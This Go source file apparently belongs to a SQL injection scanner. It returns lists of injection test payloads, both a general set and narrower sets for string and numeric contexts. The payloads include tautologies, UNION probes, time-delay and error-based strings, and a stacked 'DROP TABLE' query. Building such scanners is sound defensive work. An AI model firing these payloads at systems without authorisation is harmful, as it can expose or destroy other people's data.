package injection

// GetPayloads returns a list of SQL injection test payloads — the
// comprehensive cross-database set. For context-specific narrower
// sets, use GetContextPayloads.
func (d *SQLiDetector) GetPayloads() []string {
	return []string{
		// Basic quotes
		"'",
		"\"",

		// Classic OR-based
		"' OR '1'='1",
		"\" OR \"1\"=\"1",
		"' OR '1'='1' --",
		"' OR '1'='1' #",
		"1 OR 1=1",
		"1' OR '1'='1",

		// Comment-based
		"'--",
		"'#",
		"' /*",

		// UNION-based
		"' UNION SELECT NULL--",
		"' UNION SELECT NULL,NULL--",
		"' UNION ALL SELECT NULL--",

		// Stacked queries
		"'; SELECT 1--",
		"'; DROP TABLE test--",

		// Time-based
		"' OR SLEEP(5)--",
		"'; WAITFOR DELAY '0:0:5'--",
		"' OR pg_sleep(5)--",

		// Error-based
		"' AND 1=CONVERT(int, @@version)--",
		"' AND EXTRACTVALUE(1, CONCAT(0x7e, version()))--",
	}
}

// GetContextPayloads returns payloads optimized for the detected
// parameter context. ContextString → quote-anchored payloads;
// ContextNumeric → bare expressions; ContextUnknown → comprehensive
// fallback covering both shapes.
func (d *SQLiDetector) GetContextPayloads(context PayloadContext) []string {
	switch context {
	case ContextString:
		return []string{
			"'",
			"''",
			"' OR '1'='1",
			"' OR '1'='1'--",
			"' AND '1'='2",
			"' UNION SELECT NULL--",
		}
	case ContextNumeric:
		return []string{
			"1 OR 1=1",
			"1 AND 1=2",
			"1 UNION SELECT NULL",
			"1; SELECT 1",
		}
	default:
		return []string{
			"'",
			"\"",
			"' OR '1'='1",
			"1 OR 1=1",
			"' UNION SELECT NULL--",
			"1 UNION SELECT NULL",
			"'--",
			"'; SELECT 1--",
		}
	}
}
